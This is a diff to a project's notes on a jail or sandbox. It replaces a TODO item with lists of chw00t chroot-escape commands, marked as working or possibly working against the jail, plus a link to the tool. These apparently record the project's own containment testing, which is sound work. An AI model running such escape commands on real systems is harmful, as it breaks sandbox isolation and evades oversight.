@@ -25,6 +25,23 @@ the stdin and stdout of the parent jail process.
 
 ### TODO
 
--   Attempt to escape jail.
+-   The following exploits work:
+
+    ```none
+    /bin/chw00t -0 --dir foo
+    /bin/chw00t -1 --dir foo
+    /bin/chw00t -2 --dir foo
+    /bin/chw00t -5 --dir foo --tempdir bar --nestdir baz
+    /bin/chw00t -9 --dir foo
+    ```
+
+    https://github.com/earthquake/chw00t
+
+-   The following exploits may work:
+
+    ```none
+    /bin/chw00t -3 --dir foo
+    /bin/chw00t -4 --dir foo --tempdir bar
+    ```
 
     https://github.com/earthquake/chw00t
